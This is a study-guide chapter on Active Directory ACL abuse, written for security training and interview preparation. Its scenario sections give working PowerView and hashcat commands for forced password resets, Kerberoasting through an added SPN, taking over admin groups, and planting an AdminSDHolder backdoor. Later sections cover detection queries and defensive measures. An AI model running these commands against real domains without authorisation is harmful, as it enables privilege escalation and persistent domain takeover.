# 12 — ACL Abuse

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Advanced  
> **Privilege required:** Misconfigured ACE on any AD object

---

## 📌 What is ACL Abuse?

Every AD object has an Access Control List (ACL) defining who can do what to it. **ACL Abuse** chains together misconfigured permissions to escalate from a low-privilege account to Domain Admin — without exploiting any vulnerability, just abusing permissions that were incorrectly granted.

> **Simple definition:**  
> ACL Abuse uses misconfigured permissions on AD objects to escalate privileges — resetting passwords, adding group members, modifying permissions, or taking ownership — all through legitimate AD operations.

---

## ⚙️ Common ACL Abuse Scenarios

### Scenario 1 — ForceChangePassword

```
Situation: Hareesh has ForceChangePassword on GP's admin account

Attack:
  Set-DomainUserPassword -Identity "gp-t0" \
      -AccountPassword (ConvertTo-SecureString "Hacked@2024!" -AsPlainText -Force)
  
  Hareesh now knows GP's admin password → full Domain Admin access

Note: ForceChangePassword does NOT need to know the current password
      It directly sets a new password — bypassing authentication
```

### Scenario 2 — GenericWrite → Kerberoasting

```
Situation: IT-Helpdesk group has GenericWrite on svc_sql

Attack:
  # Add an SPN to svc_sql (previously had no SPN)
  Set-DomainObject -Identity "svc_sql" \
      -Set @{serviceprincipalname='fake/spn.company.local'}
  
  # Now Kerberoast svc_sql
  Invoke-Kerberoast -Identity "svc_sql" -OutputFormat Hashcat
  
  # Crack the service ticket
  hashcat -m 13100 svc_sql.hash rockyou.txt
  
  # Log in as svc_sql (which has admin rights)
```

### Scenario 3 — WriteDACL → Full Takeover

```
Situation: Hareesh has WriteDACL on Domain Admins group

Attack:
  # Grant himself GenericAll on Domain Admins
  Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
      -PrincipalIdentity "hareesh" \
      -Rights All
  
  # Now add himself to Domain Admins
  Add-DomainGroupMember -Identity "Domain Admins" -Members "hareesh"
  
  → Hareesh is Domain Admin ✅
  → Zero exploits used
  → Just permission manipulation
```

### Scenario 4 — WriteOwner → Full Takeover

```
Situation: Hareesh has WriteOwner on Enterprise Admins group

Attack:
  # Take ownership of the group
  Set-DomainObjectOwner -Identity "Enterprise Admins" \
      -OwnerIdentity "hareesh"
  
  # As owner → grant himself GenericAll
  Add-DomainObjectAcl -TargetIdentity "Enterprise Admins" \
      -PrincipalIdentity "hareesh" -Rights All
  
  # Add himself to Enterprise Admins
  Add-DomainGroupMember -Identity "Enterprise Admins" \
      -Members "hareesh"
  
  → Hareesh is Enterprise Admin → controls entire forest ✅
```

### Scenario 5 — AdminSDHolder Backdoor

```
What is AdminSDHolder?
  A template object whose ACL is applied to all privileged group members
  every 60 minutes by the SDProp process.

Attack:
  # Attacker adds their account to AdminSDHolder with GenericAll
  Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" \
      -PrincipalIdentity "hareesh" -Rights All
  
  # After 60 minutes — SDProp runs:
  # Hareesh now has GenericAll on:
  #   - All Domain Admins members
  #   - All Enterprise Admins members
  #   - All Schema Admins members
  #   - All privileged accounts

  # Attacker logs off for a week, comes back:
  # Still has GenericAll on all privileged accounts
  # Can reset any admin's password at any time
  # Persistent backdoor ← very hard to detect

Detection:
  Event ID 5136 — AdminSDHolder object modified
  This should trigger an immediate alert
  Monitor: any ACL change on CN=AdminSDHolder,CN=System,DC=domain,DC=local
```

---

## 🏢 Real Attack Chain Using BloodHound + ACL Abuse

```
BloodHound output for Hareesh's account:

hareesh → MemberOf → IT-Helpdesk
IT-Helpdesk → GenericWrite → svc_monitor
svc_monitor → MemberOf → IT-Service-Accounts
IT-Service-Accounts → AddMember → IT-Admins
IT-Admins → ForceChangePassword → gp-t1

Full attack execution:
  Step 1: GenericWrite on svc_monitor → add SPN → Kerberoast → crack password
  Step 2: Log in as svc_monitor (in IT-Service-Accounts)
  Step 3: AddMember → add svc_monitor to IT-Admins
  Step 4: IT-Admins has ForceChangePassword on gp-t1
  Step 5: Reset gp-t1's password → log in as Tier 1 admin
  Step 6: From Tier 1 → find next path to Tier 0 (via BloodHound)
  Step 7: Domain compromise

Time taken: ~45 minutes
Exploits used: 0
Alerts triggered: 0 (if no ACL monitoring)
```

---

## 🔍 Detection

```
Event ID 5136 — Directory Service Object Modified
  → ACL changes on sensitive objects (Domain Admins, Enterprise Admins)
  → AdminSDHolder ACL changes ← CRITICAL alert

Event ID 4728/4732/4756 — Group membership changes
  → Unexpected additions to privileged groups

Event ID 4723/4724 — Password changes
  → Admin password reset without prior auth (ForceChangePassword)

KQL for Sentinel:
  SecurityEvent
  | where EventID == 5136
  | where ObjectClass in ("group", "user")
  | where ObjectDN contains "Domain Admins" or ObjectDN contains "AdminSDHolder"
  | where SubjectUserName !in (known_acl_admins)
  | project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue

Defender for Identity:
  → "Suspicious modification of sensitive groups"
  → "Suspected AdminSDHolder manipulation"
```

---

## 🛡️ Defence

```
1. Run BloodHound quarterly as a defender:
   → Find ALL attack paths from low-privilege accounts to DA
   → Fix each path by removing the weakest permission link

2. Audit ACLs on all Tier 0 objects:
   Get-ADObject "CN=Domain Admins,CN=Users,DC=company,DC=local" |
       Get-ACL | Select-Object -ExpandProperty Access |
       Where-Object {$_.IdentityReference -notlike "*Domain Admins*" -and
                     $_.IdentityReference -notlike "*SYSTEM*"}

3. Monitor AdminSDHolder specifically:
   Any change to AdminSDHolder → immediate alert
   Review ACL weekly

4. Enable advanced AD audit logging:
   Audit Policy → DS Access → Directory Service Changes: Success/Failure

5. Implement tiered access controls:
   Regular helpdesk should NOT have ForceChangePassword on any admin account
   Review all delegation — use minimum necessary permissions

6. Restrict who can modify ACLs:
   Only Domain Admins should have WriteDACL on Tier 0 objects
   Check regularly: Get-ACL on Domain Admins, Enterprise Admins, KRBTGT
```

---

## 🎯 Interview Questions

**Q1. What is ACL Abuse and why is it so difficult to detect?**  
**A:** ACL Abuse uses legitimate AD operations — resetting passwords, adding group members, modifying permissions — that happen to be enabled by misconfigured access control entries. Because these are legitimate operations from legitimate accounts, they generate normal AD event logs that look like authorised changes. Without specific alerting on ACL modifications to sensitive objects, and without running BloodHound to identify attack paths, defenders have no way to know these permissions exist until they are abused.

**Q2. What is the AdminSDHolder and how is it abused?**  
**A:** AdminSDHolder is an AD object whose ACL is automatically propagated to all members of privileged groups every 60 minutes by the SDProp process. An attacker with write access to AdminSDHolder adds a backdoor ACE (e.g., GenericAll for their account). After 60 minutes, they have GenericAll over every Domain Admin, Enterprise Admin, and Schema Admin. This is one of the most persistent backdoors in AD — surviving password resets, account disables, and even Domain Admin removal — until the AdminSDHolder ACL itself is cleaned.

**Q3. Scenario — BloodHound shows a 5-hop path from a helpdesk account to Domain Admin. Explain how you would remediate it.**  
**A:** Identify the weakest link — the permission that is easiest to remove or least justified. For example, if hop 3 is "GenericWrite on a service account," remove that permission since helpdesk does not need GenericWrite on service accounts. After removing, rerun BloodHound to verify the path is broken and check that no alternative paths exist. Continue for each path found. Document why each permission exists — if there is no justification, remove it. Schedule quarterly BloodHound runs to catch new paths that appear through legitimate admin work.

---

*"ACL abuse is the most dangerous category of AD attack because it requires no malware, no exploits, and no unusual tools. It is entirely based on legitimate AD operations. The only way to find it is to look at your permissions with the same eyes as an attacker — and BloodHound gives you those eyes."*
